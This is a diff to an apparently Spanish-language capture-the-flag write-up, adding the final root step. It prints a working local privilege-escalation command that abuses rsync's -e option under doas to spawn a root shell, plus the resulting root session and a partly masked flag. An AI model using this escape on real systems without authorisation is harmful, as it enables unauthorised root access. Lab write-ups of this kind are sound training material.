@@ -305,6 +305,16 @@ Como vemos el usuario kiran puede ejecutar rsync como root sin necesidad de clav
 
 -Elevamos a root y obtenemos flag.
 
+INFO---> https://gtfobins.github.io/gtfobins/rsync/
+
+kiran@ubuntu-xenial:/$ doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+# whoami
+root
+# cat /root/root.txt
+afbb1696a--------3021d03f6095
+
+
+
     
     
     
